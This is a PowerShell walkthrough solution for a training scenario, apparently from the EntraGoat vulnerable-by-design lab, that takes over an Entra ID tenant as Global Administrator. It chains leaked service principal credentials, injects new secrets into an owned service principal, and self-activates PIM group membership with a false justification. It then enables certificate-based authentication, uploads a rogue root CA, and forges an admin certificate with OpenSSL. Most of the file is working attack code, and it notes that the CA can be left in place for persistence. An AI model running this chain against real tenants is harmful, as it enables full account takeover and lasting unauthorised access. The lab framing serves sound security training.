<#
.SYNOPSIS
EntraGoat Scenario 6: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 6 - CBA (Certificate Bypass Authority) - Root Access Granted

# Official blog post: https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/

Attack flow:

1. The attacker discovers hardcoded credentials for a legacy automation service principal.
This SP has Policy.ReadWrite.AuthenticationMethod permission - seems harmless, right?

2. Through enumeration, the attacker discovers this legacy SP owns other service principals.
Ownership means the ability to add credentials and authenticating as the SP (as seen in Scenario 1).

3. The second service principal has Organization.ReadWrite.All permission. 
While not capable of managing users or roles, this permission allows modification of tenant-wide configurations, including authentication settings.

4. The terence.mckenna user is found to be PIM-eligible for a group that holds the Authentication Policy Administrator role. 
After activating membership, the attacker enables CBA across the tenant.

5. The attacker uploads a rogue root CA certificate, making it a trusted certificate authority for authentication purposes.

6. With CBA enabled and a malicious root CA trusted, the attacker can create certificates
for ANY user in the tenant, including the Global Administrator user, EntraGoat-admin-s6.

7. The attacker authenticates as the GA using a certificate - no password needed.
This persists through password resets and might not trigger typical authentication alerts.

- - -

--> So... why this works?
This attack exploits several Entra ID design decisions and common misconfigurations:

1. Service Principal ownership: SP ownership grants credential management rights.
   Some organizations don't audit SP ownership chains or realize the implications.

2. Compound permissions: The attack requires multiple permissions that seem benign alone:
   - Organization.ReadWrite.All - grants the ability to modify org-wide configuration settings.
   - Authentication Policy Administrator (or Policy.ReadWrite.AuthenticationMethod) - enables and configures CBA.

3. Certificate-Based Authentication: CBA pierces the tenant's trust boundary.
   Once configured, the external CA becomes a valid identity issuer for any user in the tenant.

4. Legacy automation debt: Old SPs accumulate permissions over time.
   Credentials get embedded in scripts and might be forgotten once "everything works".

Common scenarios where this happens:
- SPs created for POCs become production dependencies
- DevOps teams create automation SPs that accumulate permissions
- Ownership chains form when SPs create other SPs programmatically
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK or manual certificate creation with OpenSSL
#>

function Find-OwnedServicePrincipals {
    param([string]$PrincipalId)
    
    # Get all service principals in tenant
    $allSPs = Get-MgServicePrincipal -All
    Write-Host "Found $($allSPs.Count) service principals in tenant"
    
    $ownedSPs = @()
    $checkCount = 0
    
    # Check ownership of each service principal
    foreach ($sp in $allSPs) {
        $checkCount++
        if ($checkCount % 50 -eq 0) {
            Write-Host "Checked $checkCount/$($allSPs.Count) service principals..."
        }
        
        try {
            $owners = Get-MgServicePrincipalOwner -ServicePrincipalId $sp.Id -ErrorAction SilentlyContinue
            if ($owners) {
                foreach ($owner in $owners) {
                    if ($owner.Id -eq $PrincipalId) {
                        $ownedSPs += $sp
                        Write-Host "OWNED SERVICE PRINCIPAL FOUND!" -ForegroundColor Red
                        Write-Host "   Name: $($sp.DisplayName)" -ForegroundColor Yellow
                        Write-Host "   SP ID: $($sp.Id)" -ForegroundColor Yellow
                        Write-Host "   App ID: $($sp.AppId)" -ForegroundColor Yellow
                        break
                    }
                }
            }
        } catch {
            continue
        }
    }
    return $ownedSPs
}

# Check directory role assignments for a given SP
function Get-ServicePrincipalRoles {
    param([object]$ServicePrincipal)
    
    Write-Host "Checking roles for: $($ServicePrincipal.DisplayName)"
    $roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($ServicePrincipal.Id)'" -ErrorAction SilentlyContinue
    $roles = @()
    
    if ($roleAssignments) {
        foreach ($assignment in $roleAssignments) {
            $roleDefinition = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $assignment.RoleDefinitionId
            $roles += $roleDefinition
            Write-Host "   Role: $($roleDefinition.DisplayName)" -ForegroundColor Green
        }
    } else {
        Write-Host "   No directory roles assigned"
    }
    
    return $roles
}


# Step 1: Initial foothold with hardcoded service principal credentials
# use leaked credentials from the setup output
$clientId = "[PASTE_LEGACY_APP_ID_HERE]"
$clientSecret = "[PASTE_LEGACY_CLIENT_SECRET_HERE]"
$tenantId = "[PASTE_TENANT_ID_HERE]"

$secureSecret = ConvertTo-SecureString -String $clientSecret -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $clientId, $secureSecret
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $credential

# Verify authentication and permissions
Get-MgContext
# Scopes - Directory.Read.All and Application.ReadWrite.OwnedBy. Interesting...

# Step 2: Enumeration 
# Get current SP object info
$legacySP = Get-MgServicePrincipal -Filter "appId eq '$clientId'"
$legacySP

# Check group memberships
Get-MgServicePrincipalMemberOf -ServicePrincipalId $legacySP.Id

# Check owned SPs - The simple way:
$ownedSPs = Get-MgServicePrincipal -All | Where-Object {
    $owners = Get-MgServicePrincipalOwner -ServicePrincipalId $_.Id
    $owners.Id -contains $legacySP.Id
}
$ownedSPs | Format-Table DisplayName, AppId

# The fancy way:
$ownedSPs = Find-OwnedServicePrincipals -PrincipalId $legacySP.Id

# owning "DataSync-Production" SP!

# Let's check what roles the SP has?
foreach ($sp in $ownedSPs) {
    $roles = Get-ServicePrincipalRoles -ServicePrincipal $sp
}

# welp, no roles. What about permissions?
$dataSyncSP = Get-MgServicePrincipal -Filter "displayName eq 'DataSync-Production'"
$dataSyncPerms = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $dataSyncSP.Id
foreach ($perm in $dataSyncPerms) {
    $resource = Get-MgServicePrincipal -ServicePrincipalId $perm.ResourceId
    $role = $resource.AppRoles | Where-Object { $_.Id -eq $perm.AppRoleId }
    "$($resource.DisplayName): $($role.Value)"
}
# Organization.ReadWrite.All - this permission allows this SP to add a shiny brand new Root CA to the tenant!

# Step 3: Pivoting to "DataSync-Production" SP
# the Legacy SP we authenticated as owns that DataSync SP ~AND~ has "Application.ReadWrite.OwnedBy" permission - meaning we can add credentials to SPs we own. 
$secretDescription = "EntraGoat-Secret-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$passwordCredential = @{
    DisplayName = $secretDescription
    EndDateTime = (Get-Date).AddYears(1)
}

$newSecret = Add-MgServicePrincipalPassword -ServicePrincipalId $dataSyncSP.Id -PasswordCredential $passwordCredential
$dataSyncSecret = $newSecret.SecretText # save it for later

# the problem we're facing is that although we can add a "trusted" (wink wink) root CA, we can't enable CBA to use it.
# we need an identity with "Policy.ReadWrite.AuthenticationMethod" permission or Authentication Policy Administrator role to do so.
$cba = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId "X509Certificate"

# 403 Error

# "DataSync-Production" SP also can't enable CBA:
Disconnect-MgGraph

$dsSecure = ConvertTo-SecureString -String $dataSyncSecret -AsPlainText -Force
$dsCred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $dataSyncSP.AppId, $dsSecure
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $dsCred

Get-MgContext

$cba = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId "X509Certificate"
# 403 Error (yet again)

# To use the root CA attack vector, we first need a method to enable CBA.

Disconnect-MgGraph

# Step 4: Shifting focus to user context - This can be done 100% from the Azure portal
# Authenticate as the low-privilege user and continue the enumeration
$tenantId = "[YOUR-TENANT-ID]"
$password = "TheGoatAccess!123"
$UPN = "terence.mckenna@[YOUR-TENANT-DOMAIN].onmicrosoft.com"

Connect-MgGraph -AccessToken (ConvertTo-SecureString ((Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId).access_token) -AsPlainText -Force)

# basic user enumerations: 
$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"
$currentUser | Select-Object DisplayName, Id, UserPrincipalName, JobTitle

# Check for directory roles (should be empty for this scenario)
Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($currentUser.Id)'" | Select-Object RoleDefinitionId

# what groups are we a member of (if any)?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# any owned directory objects by this user? (should be empty)
Get-MgUserOwnedObject -UserId $currentUser.Id -All

# What about PIM eligible assignments in groups?
$eligibilities = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/eligibilitySchedules?`$filter=principalId eq '$($currentUser.Id)'"

$eligibilities.value | ForEach-Object {
    $group = Get-MgGroup -GroupId $_.groupId
    "Eligible *$($_.accessId)* for: $($group.DisplayName) (ID: $($group.Id)) "
}

# Eligible member for Authentication Policy Managers group!

# What can this group can do?
$authGroup = Get-MgGroup -Filter "displayName eq 'Authentication Policy Managers'"

# group's roles
Get-MgDirectoryRole -All | ForEach-Object {
    $role = $_
    $members = Get-MgDirectoryRoleMember -DirectoryRoleId $role.Id -All
    if ($members.Id -contains $authGroup.Id) {
        $role.DisplayName 
    }
}
# Authentication Policy Administrator
# Application Administrator

# those are 2 very powerful roles. with the Auth Policy Admin role, we can enable CBA and with App Admin we can add credentials to any SP.

# Step 5: Activating PIM assignment 
$activationBody = @{
    accessId = "member"
    principalId = $currentUser.Id
    groupId = $authGroup.Id
    action = "selfActivate"
    scheduleInfo = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration = @{
            type = "afterDuration"
            duration = "PT8H"
        }
    }
    justification = "Need to configure authentication policies for support tickets"
} 

Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
    -Body $activationBody -ContentType "application/json"


# wait for activations to complete - this may take a while

# what groups are we a member of NOW?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# Step 6: might need to refresh our access token

Disconnect-MgGraph

# this step can be done manually from the MS Entra admin center via:
# login to https://entra.microsoft.com -> Entra ID -> Authentication methods -> Policies -> Certificate-based authentication -> Enable
# but we'll automate it here

Connect-MgGraph -Scopes "Policy.ReadWrite.AuthenticationMethod" -TenantId $tenantId 

# Check if we can now access the CBA policy
$cba = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId "X509Certificate"
$cba.State
# disabled

# Step 7: Enable CBA (if not already enabled on the tenant)
$updateParams = @{
    State = "enabled"
    "@odata.type" = "#microsoft.graph.x509CertificateAuthenticationMethodConfiguration"
    certificateUserBindings = @(
        @{
            x509CertificateField = "PrincipalName"
            userProperty = "userPrincipalName"
            priority = 1
        }
    )
    authenticationModeConfiguration = @{
        x509CertificateAuthenticationDefaultMode = "x509CertificateSingleFactor"
        rules = @()
    }
}
   
Update-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration `
    -AuthenticationMethodConfigurationId "X509Certificate" -BodyParameter $updateParams

# Check that it indeed worked
$cba = Get-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId "X509Certificate"
$cba.State
# enabled

# Step 8: Create and add malicious Root CA (using DataSync SP context)
# Now that we have CAB enabled, we can authenticate as the DataSync SP and add a malicious root CA to the tenant's trusted CAs

Disconnect-MgGraph
Connect-MgGraph -TenantId $tenantId -ClientSecretCredential $dsCred

# NOTE: creating, configuring and uploading a root CA and client certificate is a complex process with multiple error-prone steps.
# Entra ID requires a very specific format for the UPN in the SAN extension that PowerShell struggles to create with a correct OID properly.
# Because of that we'll use OpenSSL to create the root CA and client certificate.

# OpenSSL commands adapted for PowerShell
$opensslBinary = "C:\Program Files\OpenSSL-Win64\bin\openssl.exe"

$adminUPN = (Get-MgUser -Filter "startswith(userPrincipalName,'EntraGoat-admin-s6')").UserPrincipalName

# Setup certificate authority directory structure (clean slate for multiple runs)
$caWorkspace = "$env:TEMP\EntraGoat-CA"
if (Test-Path $caWorkspace) {
    Set-Location $env:TEMP  # Move out of the directory first
    Remove-Item $caWorkspace -Recurse -Force
}
@("$caWorkspace", "$caWorkspace\ca", "$caWorkspace\ca\issued") | ForEach-Object {
    New-Item -Path $_ -ItemType Directory -Force | Out-Null
}

# Initialize certificate database (OpenSSL requires specific format)
New-Item -Path "$caWorkspace\ca\index.db" -ItemType File -Force | Out-Null
"01" | Out-File "$caWorkspace\ca\serial" -Encoding ASCII -NoNewline

# Root Certificate Authority configuration
$caConfig = @"
[ ca ]
default_ca = entragoat_ca

[ entragoat_ca ]
dir = ./ca
certs = `$dir
new_certs_dir = `$dir/issued
database = `$dir/index.db
serial = `$dir/serial
RANDFILE = `$dir/.rand
certificate = `$dir/entragoat-root.cer
private_key = `$dir/entragoat-root.key
default_days = 730
default_crl_days = 30
default_md = sha256
preserve = no
policy = trust_no_one_policy

[ trust_no_one_policy ]
countryName = optional
stateOrProvinceName = optional
localityName = optional
organizationName = optional
organizationalUnitName = optional
commonName = optional
emailAddress = optional

[req]
x509_extensions = user_cert
req_extensions = v3_req

[ user_cert ]
subjectAltName = @alt_names

[ v3_req ]
subjectAltName = @alt_names

[alt_names]
otherName=1.3.6.1.4.1.311.20.2.3;UTF8:$adminUPN
"@

# Client certificate configuration with SAN extension
$clientConfig = @"
[req]
x509_extensions = user_cert
req_extensions = v3_req

[ user_cert ]
subjectAltName = @alt_names

[ v3_req ]
subjectAltName = @alt_names

[alt_names]
otherName=1.3.6.1.4.1.311.20.2.3;UTF8:$adminUPN
"@

# Write configuration files
$caConfig | Out-File "$caWorkspace\ca.conf" -Encoding ASCII
$clientConfig | Out-File "$caWorkspace\client.conf" -Encoding ASCII

Set-Location $caWorkspace

# Generate root CA private key
& $opensslBinary genrsa -out ca\entragoat-root.key 4096

# Create root certificate for entra trust
& $opensslBinary req -new -x509 -days 3650 -key ca\entragoat-root.key -out ca\entragoat-root.cer -subj "/CN=EntraGoat Evil Root CA/O=EntraGoat Security/C=US"

Write-Output "Root CA certificate path: $caWorkspace\ca\entragoat-root.cer" # upload this to the tenant

# Automated Root CA Upload to Tenant
Connect-MgGraph -Scopes "Organization.ReadWrite.All"

# Load the root certificate
$rootCA = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new("$caWorkspace\ca\entragoat-root.cer")

# Prepare CA authority object for CBA configuration
$caAuthority = @{
    isRootAuthority = $true
    certificate = [System.Convert]::ToBase64String($rootCA.GetRawCertData())
}

# Try to get existing CBA configuration
try {
    $existingConfigs = Invoke-MgGraphRequest -Method GET `
        -Uri "https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration"
    
    if ($existingConfigs.value -and $existingConfigs.value.Count -gt 0) {
        # Update existing configuration
        $configId = $existingConfigs.value[0].id
        $existingCAs = $existingConfigs.value[0].certificateAuthorities
        
        # Add new CA to existing ones
        $updatedCAs = $existingCAs + @($caAuthority)
        
        $updateBody = @{
            certificateAuthorities = $updatedCAs
        } | ConvertTo-Json -Depth 3
        
        $response = Invoke-MgGraphRequest -Method PATCH `
            -Uri "https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration/$configId" `
            -Body $updateBody `
            -ContentType "application/json"
    } else {
        throw "No existing configuration found"
    }
}
catch {
    # Create new CBA configuration
    $body = @{
        certificateAuthorities = @($caAuthority)
    } | ConvertTo-Json -Depth 3
    
    $response = Invoke-MgGraphRequest -Method POST `
        -Uri "https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration" `
        -Body $body `
        -ContentType "application/json"
}

# Verify Root CA Upload
$configs = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/organization/$tenantId/certificateBasedAuthConfiguration"

$uploadSuccess = $false
if ($configs.value -and $configs.value.Count -gt 0) {
    foreach ($ca in $configs.value[0].certificateAuthorities) {
        $certBytes = [Convert]::FromBase64String($ca.certificate)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]::new($certBytes)
        
        if ($cert.Thumbprint -eq $rootCA.Thumbprint) {
            Write-Output "[+] Root CA successfully uploaded to tenant"
            Write-Output "    Thumbprint: $($cert.Thumbprint)"
            Write-Output "    Subject: $($cert.Subject)"
            $uploadSuccess = $true
            break
        }
    }
}

if (-not $uploadSuccess) {
    Write-Output "[-] Failed to verify root CA upload - you will have to upload it manually." 
    exit 1
}

# Generate client certificate private key and signing request
& $opensslBinary req -new -sha256 -config client.conf -newkey rsa:4096 -nodes -keyout "$adminUPN.key" -out "$adminUPN.csr" -subj "/C=US/ST=Washingaot/L=EvilDistrict/O=EntraGoat/OU=Security/CN=$adminUPN"

# Sign the client certificate with root CA
& $opensslBinary ca -batch -md sha256 -config ca.conf -extensions v3_req -out "$adminUPN.crt" -infiles "$adminUPN.csr"

# Convert to PFX format for Windows installation
& $opensslBinary pkcs12 -inkey "$adminUPN.key" -in "$adminUPN.crt" -export -out "$adminUPN.pfx" -password pass:EntraGoat123!


# Step 8: Authenticate as Global Admin using the certificate

<#
To complete the attack:
    1. Install the pfx certificate from: $caWorkspace (password: EntraGoat123!)
    2. Navigate to https://portal.azure.com or https://entra.microsoft.com/
    3. Enter the admin UPN: $adminUPN
    4. When prompted, select the certificate for authentication

If you get an error about "Certificate validation failed", you probably didn't create/configure/install the client/root CA correctly.

BUT 

if you get an the pop up of "Stay signed in?" (meaning the cert is valid) and then after clicking yes/no you get the error about
"Choose a way to sign in" - it means that Certificate-Based Authentication is enabled BUT its "Default authentication strength" is 
set to "Single-factor" and not "Multi-factor". To change the default authentication strength, you can do it from the Entra admin center:
Authentication methods -> Policies -> Certificate-based authentication -> Configure -> Under "Authentication binding" change "Default authentication strength" from "Single-Factor" to "Multi-Factor"
This also can be accomplished automatically by:
#>

# Get current config
$current = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate"

# Check current mode
$current.authenticationModeConfiguration.x509CertificateAuthenticationDefaultMode

# Update payload - change SingleFactor to MultiFactor
$params = @{
    "@odata.type" = "#microsoft.graph.x509CertificateAuthenticationMethodConfiguration"
    id = "X509Certificate"
    certificateUserBindings = $current.certificateUserBindings
    authenticationModeConfiguration = @{
        x509CertificateAuthenticationDefaultMode = "x509CertificateMultiFactor"
        x509CertificateDefaultRequiredAffinityLevel = "low"
        rules = @()
    }
    includeTargets = $current.includeTargets
    excludeTargets = $current.excludeTargets
    state = "enabled"
    issuerHintsConfiguration = $current.issuerHintsConfiguration
    crlValidationConfiguration = $current.crlValidationConfiguration
    certificateAuthorityScopes = @()
}

# Apply change
Invoke-MgGraphRequest -Method PATCH -Uri "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate" -Body ($params | ConvertTo-Json -Depth 10)

# Verify change
$updated = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/policies/authenticationmethodspolicy/authenticationMethodConfigurations/X509Certificate"
$updated.authenticationModeConfiguration.x509CertificateAuthenticationDefaultMode

# the root CA can be remained in the tenant for persistence purposes and any user certificate signed by the CA will be able to authenticate

# Consider: cleanup certificates from local store by the following commands
Remove-Item -Path "Cert:\CurrentUser\My\$($rootCA.Thumbprint)" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "Cert:\CurrentUser\My\$($clientCert.Thumbprint)" -Force -ErrorAction SilentlyContinue

# Don't forget to run the cleanup script to restore the tenant to it's original state!
# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.

# Official blog post: https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/